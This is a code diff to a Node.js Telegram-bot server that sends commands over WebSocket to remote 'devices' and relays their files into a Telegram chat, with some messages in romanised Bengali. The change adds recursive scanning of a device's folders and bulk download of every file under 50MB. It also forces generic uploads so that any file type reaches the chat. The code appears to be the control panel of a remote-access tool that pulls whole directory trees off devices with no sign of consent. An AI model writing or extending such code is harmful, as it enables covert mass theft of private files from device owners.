@@ -280,18 +280,41 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
     const escapedName = escapeMd(name);
     await bot.sendMessage(chatId, `⬇️ Sending: *${escapedName}* (${formatSize(buffer.length)})…`, { parse_mode: 'Markdown' });
 
-    const imageExts = ['jpg','jpeg','png','gif','webp'];
-    const videoExts = ['mp4','3gp','mov'];
-    const audioExts = ['mp3','m4a','aac','ogg'];
+    const imageExts = ['jpg','jpeg','png','gif','webp','bmp','heic','heif'];
+    const videoExts = ['mp4','mkv','avi','mov','3gp','webm'];
+    const audioExts = ['mp3','m4a','aac','ogg','wav','flac','opus'];
+    const codeExts  = ['html','htm','php','js','ts','mjs','css','json','xml','py','sh','bat','c','cpp','java'];
+    const textExts  = ['txt','log','csv','md','ini','cfg','conf','yaml','yml'];
+    const archExts  = ['zip','rar','7z','tar','gz','bz2'];
 
+    // Always pass contentType explicitly to avoid: EFATAL: Unsupported Buffer file-type
+    // node-telegram-bot-api fails when it cannot detect type from buffer magic bytes
     if (imageExts.includes(ext)) {
-      await bot.sendPhoto(chatId, buffer, { caption: `📷 ${escapedName}` }, { filename: name });
-    } else if (videoExts.includes(ext)) {
-      await bot.sendVideo(chatId, buffer, { caption: `🎬 ${escapedName}` }, { filename: name });
-    } else if (audioExts.includes(ext)) {
-      await bot.sendAudio(chatId, buffer, { caption: `🎵 ${escapedName}` }, { filename: name });
+      const mime = ext === 'jpg' ? 'image/jpeg' : 'image/' + ext;
+      await bot.sendPhoto(chatId, buffer,
+        { caption: '📷 ' + escapedName },
+        { filename: name, contentType: mime }
+      ).catch(() =>
+        bot.sendDocument(chatId, buffer,
+          { caption: '🖼️ ' + escapedName },
+          { filename: name, contentType: 'application/octet-stream' }
+        )
+      );
     } else {
-      await bot.sendDocument(chatId, buffer, { caption: `📎 ${escapedName} — from ${escapeMd(getDeviceName(deviceId))}` }, { filename: name });
+      // All non-image types → sendDocument with octet-stream
+      // This works for EVERY extension: .html .php .js .apk .zip .mp4 .mp3 .pdf etc.
+      let emoji = '📎';
+      if (videoExts.includes(ext))  emoji = '🎬';
+      else if (audioExts.includes(ext))  emoji = '🎵';
+      else if (ext === 'pdf')            emoji = '📄';
+      else if (ext === 'apk')            emoji = '📦';
+      else if (archExts.includes(ext))   emoji = '🗜️';
+      else if (codeExts.includes(ext))   emoji = '💻';
+      else if (textExts.includes(ext))   emoji = '📋';
+      await bot.sendDocument(chatId, buffer,
+        { caption: emoji + ' ' + escapedName },
+        { filename: name, contentType: 'application/octet-stream' }
+      );
     }
     console.log(`[BOT] File sent to chat ${chatId}: ${name} (${formatSize(buffer.length)})`);
   } catch (err) {
@@ -693,7 +716,12 @@ function initTelegramBot() {
 
       pendingBotFileRequests.set(devId + '_getall', {
         chatId, msgId: loadMsg.message_id,
-        type: 'get_all_files', path: resolvedPath
+        type: 'get_all_files', path: resolvedPath,
+        rootPath: resolvedPath,
+        phase: 'scanning',
+        scanQueue: [],
+        collectedFiles: [],
+        scannedFolders: 0
       });
 
       sendCommandToDevice(devId, { command: 'list_dir', path: resolvedPath });
@@ -703,7 +731,7 @@ function initTelegramBot() {
           pendingBotFileRequests.delete(devId + '_getall');
           bot.sendMessage(chatId, "⏱️ Timeout — device respond koreni.");
         }
-      }, 15000);
+      }, 60000); // 60s for recursive scan
       return;
     }
 
@@ -1682,108 +1710,146 @@ wss.on('connection', (ws, req) => {
             }
           }
 
-          // ── get_all_files: intercept list_dir_result, then download all ──
+          // ── get_all_files: intercept list_dir_result for recursive scan ──
           const pendingAll = pendingBotFileRequests.get(deviceId + '_getall');
           if (pendingAll && payload.action === 'list_dir_result') {
-            pendingBotFileRequests.delete(deviceId + '_getall');
-            const items   = payload.items || [];
-            const files   = items.filter(i => !i.isDirectory);
-            const chatId2 = pendingAll.chatId;
-            const folderPath = payload.currentPath || pendingAll.path;
 
-            if (files.length === 0) {
-              bot.sendMessage(chatId2,
-                `📂 *${escapeMd(folderPath)}*\n\n_Ei folder e kono file nai._`,
-                { parse_mode: 'Markdown' });
-              return;
-            }
+            // ── Phase 1: collecting folder contents recursively ──────────
+            if (pendingAll.phase === 'scanning') {
+              const items      = payload.items || [];
+              const files      = items.filter(i => !i.isDirectory);
+              const subfolders = items.filter(i => i.isDirectory);
+              const chatId2    = pendingAll.chatId;
 
-            // Edit the scanning message with summary
-            bot.editMessageText(
-              `📥 *Get All Files*\n\n` +
-              `📂 \`${escapeMd(folderPath)}\`\n` +
-              `📊 *${files.length} ta file* pawa geche\n\n` +
-              `⬇️ Download shuru hocche… 0/${files.length}`,
-              { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
-            ).catch(() => {});
+              // Add files found in this folder
+              pendingAll.collectedFiles.push(...files);
 
-            // Sequential download with delay to avoid flooding
-            (async () => {
-              let sent = 0, skipped = 0, failed = 0;
-              for (let i = 0; i < files.length; i++) {
-                const file = files[i];
-                try {
-                  // Update progress every 5 files or on first/last
-                  if (i % 5 === 0 || i === files.length - 1) {
-                    bot.editMessageText(
-                      `📥 *Get All Files — Progress*\n\n` +
-                      `📂 \`${escapeMd(folderPath)}\`\n` +
-                      `📊 ${files.length} ta file\n\n` +
-                      `⬇️ Downloading: ${i + 1}/${files.length}\n` +
-                      `✅ Sent: ${sent}  ⏭ Skipped: ${skipped}  ❌ Failed: ${failed}\n\n` +
-                      `_Current: ${escapeMd(file.name)}_`,
-                      { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
-                    ).catch(() => {});
-                  }
-
-                  // Skip files > 50MB
-                  if (file.size && file.size > 50 * 1024 * 1024) {
-                    bot.sendMessage(chatId2,
-                      `⏭️ *Skip* (>50MB): \`${escapeMd(file.name)}\` — ${formatSize(file.size)}`,
-                      { parse_mode: 'Markdown' });
-                    skipped++;
-                    continue;
-                  }
-
-                  // Download file from device
-                  const fileData = await new Promise((resolve, reject) => {
-                    const dlKey = deviceId + '_getall_dl_' + i;
-                    const timeout = setTimeout(() => {
-                      pendingBotFileRequests.delete(dlKey);
-                      reject(new Error('Download timeout'));
-                    }, 120000);
-
-                    pendingBotFileRequests.set(dlKey, {
-                      chatId: chatId2, msgId: null,
-                      type: 'download_file_getall',
-                      resolve, reject, timeout
-                    });
-                    sendCommandToDevice(deviceId, { command: 'download_file', path: file.path });
-                  });
-
-                  // Send to Telegram
-                  await handleBotFileDownload(chatId2, deviceId, fileData);
-                  sent++;
-
-                  // Small delay to avoid Telegram flood limits
-                  await new Promise(r => setTimeout(r, 500));
-
-                } catch (err) {
-                  console.error(`[GET_ALL] File failed: ${file.name}`, err.message);
-                  failed++;
-                  // Continue with next file
-                  await new Promise(r => setTimeout(r, 300));
-                }
+              // If subfolders exist, queue them for scanning
+              if (subfolders.length > 0) {
+                pendingAll.scanQueue.push(...subfolders.map(f => f.path));
               }
 
-              // Final summary
-              bot.editMessageText(
-                `✅ *Get All Files — Done!*\n\n` +
-                `📂 \`${escapeMd(folderPath)}\`\n\n` +
-                `📊 Total: ${files.length} ta file\n` +
-                `✅ Sent: ${sent}\n` +
-                `⏭️ Skipped (>50MB): ${skipped}\n` +
-                `❌ Failed: ${failed}`,
-                { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown',
-                  reply_markup: { inline_keyboard: [[
-                    { text: '◀️ Back to Device', callback_data: `sel:${deviceId}` }
-                  ]]} }
-              ).catch(() =>
-                bot.sendMessage(chatId2,
-                  `✅ *Shesh!* ${sent} ta file pathano hoyeche, ${skipped} ta skip, ${failed} ta fail.`,
-                  { parse_mode: 'Markdown' })
-              );
-            })();
+              // Process next folder in queue
+              if (pendingAll.scanQueue.length > 0) {
+                const nextPath = pendingAll.scanQueue.shift();
+                pendingAll.scannedFolders = (pendingAll.scannedFolders || 0) + 1;
+                // Update scanning progress message
+                bot.editMessageText(
+                  `🔍 *Scanning…*\n\n` +
+                  `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                  `📁 Folders scanned: ${pendingAll.scannedFolders}\n` +
+                  `📄 Files found so far: ${pendingAll.collectedFiles.length}\n\n` +
+                  `_Current: ${escapeMd(nextPath.split('/').pop())}_`,
+                  { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+                ).catch(() => {});
+                // Scan next subfolder (keep same _getall key)
+                sendCommandToDevice(deviceId, { command: 'list_dir', path: nextPath });
+                return; // wait for next list_dir_result
+
+              } else {
+                // All folders scanned — start downloading
+                const allFiles = pendingAll.collectedFiles;
+                pendingBotFileRequests.delete(deviceId + '_getall');
+
+                if (allFiles.length === 0) {
+                  bot.editMessageText(
+                    `📂 *${escapeMd(pendingAll.rootPath)}*\n\n_Kono file pawa jaynai (folder khali ba only subfolders)._`,
+                    { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+                  ).catch(() =>
+                    bot.sendMessage(chatId2, `📂 Kono file pawa jaynai.`)
+                  );
+                  return;
+                }
+
+                // Show summary before download starts
+                bot.editMessageText(
+                  `📥 *Get All Files*\n\n` +
+                  `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                  `📁 Folders: ${pendingAll.scannedFolders || 1}\n` +
+                  `📊 *${allFiles.length} ta file* pawa geche\n\n` +
+                  `⬇️ Download shuru hocche… 0/${allFiles.length}`,
+                  { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+                ).catch(() => {});
+
+                // Sequential download
+                (async () => {
+                  let sent = 0, skipped = 0, failed = 0;
+                  for (let i = 0; i < allFiles.length; i++) {
+                    const file = allFiles[i];
+
+                    // Progress update every 5 files
+                    if (i % 5 === 0 || i === allFiles.length - 1) {
+                      bot.editMessageText(
+                        `📥 *Get All Files — Progress*\n\n` +
+                        `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                        `📊 ${allFiles.length} ta file\n\n` +
+                        `⬇️ Downloading: ${i + 1}/${allFiles.length}\n` +
+                        `✅ Sent: ${sent}  ⏭ Skipped: ${skipped}  ❌ Failed: ${failed}\n\n` +
+                        `_📄 ${escapeMd(file.name)}_`,
+                        { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+                      ).catch(() => {});
+                    }
+
+                    // Skip files > 50MB
+                    if (file.size && file.size > 50 * 1024 * 1024) {
+                      bot.sendMessage(chatId2,
+                        `⏭️ *Skip* (>50MB): \`${escapeMd(file.name)}\` — ${formatSize(file.size)}`,
+                        { parse_mode: 'Markdown' });
+                      skipped++;
+                      continue;
+                    }
+
+                    try {
+                      const fileData = await new Promise((resolve, reject) => {
+                        const dlKey = deviceId + '_getall_dl_' + i;
+                        const timeout = setTimeout(() => {
+                          pendingBotFileRequests.delete(dlKey);
+                          reject(new Error('Download timeout'));
+                        }, 120000);
+                        pendingBotFileRequests.set(dlKey, {
+                          chatId: chatId2, msgId: null,
+                          type: 'download_file_getall',
+                          resolve, reject, timeout
+                        });
+                        sendCommandToDevice(deviceId, { command: 'download_file', path: file.path });
+                      });
+
+                      await handleBotFileDownload(chatId2, deviceId, fileData);
+                      sent++;
+                      await new Promise(r => setTimeout(r, 500));
+
+                    } catch (err) {
+                      console.error(`[GET_ALL] File failed: ${file.name}`, err.message);
+                      bot.sendMessage(chatId2,
+                        `❌ \`${escapeMd(file.name)}\` — ${escapeMd(err.message)}`,
+                        { parse_mode: 'Markdown' });
+                      failed++;
+                      await new Promise(r => setTimeout(r, 300));
+                    }
+                  }
+
+                  // Final summary
+                  bot.editMessageText(
+                    `✅ *Get All Files — Done!*\n\n` +
+                    `📂 \`${escapeMd(pendingAll.rootPath)}\`\n\n` +
+                    `📊 Total: ${allFiles.length} ta file\n` +
+                    `✅ Sent: ${sent}\n` +
+                    `⏭️ Skipped (>50MB): ${skipped}\n` +
+                    `❌ Failed: ${failed}`,
+                    {
+                      chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown',
+                      reply_markup: { inline_keyboard: [[
+                        { text: '◀️ Back to Device', callback_data: `sel:${deviceId}` }
+                      ]]}
+                    }
+                  ).catch(() =>
+                    bot.sendMessage(chatId2,
+                      `✅ *Shesh!* ${sent} ta file pathano hoyeche, ${skipped} skip, ${failed} fail.`,
+                      { parse_mode: 'Markdown' })
+                  );
+                })();
+              }
+            }
           }
 
           // ── intercept download_file_result for get_all sequential downloads ──
